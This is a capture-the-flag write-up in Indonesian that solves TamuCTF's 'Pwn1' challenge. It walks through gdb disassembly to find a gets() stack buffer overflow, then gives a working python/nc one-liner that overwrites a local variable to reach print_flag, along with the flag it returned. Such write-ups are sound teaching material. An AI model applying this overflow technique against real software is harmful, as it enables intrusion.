# __TamuCTF__
## _Pwn1_

## Information
**Category:** | **Points**
pwn | 227

**Description**

> nc pwn.tamuctf.com 4321
> Difficulty: easy
> [pwn1](./pwn1)

### Pwn1
#### File
```
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

#### Run
```
[l0l@l0l Pwn1]$ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
((ThisIsInput))
I don't know that! Auuuuuuuugh!
```

#### Solve
Langsung coba buka di gdb. Hanya ada dua fungsi yang menarik, yaitu `main` dan `print_flag`.

Seperti namanya, fungsi `print_flag` hanya melakukan print flag setelah kita berhasil melewati beberapa pengecekan di fungsi `main`.

Pengecekan pertama dan kedua hanya dengan melakukan `strcmp` antara input kita dengan string yang tersimpan di program. Tinggal masukkan input yang sesuai dengan yang dibandingkan `strcmp`:
```
gdb-peda$ x/s $ebx-0x15b5
0x565559fb:     "What... is your name?"
gdb-peda$ x/s $ebx-0x159f
0x56555a11:     "Sir Lancelot of Camelot\n"

gdb-peda$ x/s $ebx-0x1564
0x56555a4c:     "What... is your quest?"
gdb-peda$ x/s $ebx-0x154d
0x56555a63:     "To seek the Holy Grail.\n"
```

Setelah itu baru kita masuk ke vulnerability utama dari program, yaitu pada kode bagian :
```
   0x56555891 <+280>:   sub    esp,0xc
   0x56555894 <+283>:   lea    eax,[ebx-0x1534]
   0x5655589a <+289>:   push   eax
   0x5655589b <+290>:   call   0x56555550 <puts@plt>
   0x565558a0 <+295>:   add    esp,0x10
   0x565558a3 <+298>:   sub    esp,0xc
   0x565558a6 <+301>:   lea    eax,[ebp-0x3b]
   0x565558a9 <+304>:   push   eax
=> 0x565558aa <+305>:   call   0x56555520 <gets@plt>
   0x565558af <+310>:   add    esp,0x10
   0x565558b2 <+313>:   cmp    DWORD PTR [ebp-0x10],0xdea110c8
   0x565558b9 <+320>:   jne    0x565558c2 <main+329>
   0x565558bb <+322>:   call   0x565556fd <print_flag>
```

Terdapat celah buffer overflow pada fungsi `gets`. Kita hanya perlu mengubah nilai alamat di `$ebp-0x10` dengan 0xdea110c8. Input kita mulai disimpan pada `$ebp-0x3b` berarti kita butuh 43 karakter sebelum overwrite address yang diinginkan.

#### Payload
```
python2 -c "from pwn import p32;print 'Sir Lancelot of Camelot\nTo seek the Holy Grail.\n'+'A'*(0x3b-0x10)+p32(0xdea110c8)" | nc pwn.tamuctf.com 4321
```

#### Result
```
[l0l@l0l ~]$ python2 -c "from pwn import p32;print 'Sir Lancelot of Camelot\nTo seek the Holy Grail.\n'+'A'*(0x3b-0x10)+p32(0xdea110c8)" | nc pwn.tamuctf.com
4321
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
gigem{34sy_CC428ECD75A0D392}
```

#### Flag
gigem{34sy_CC428ECD75A0D392}
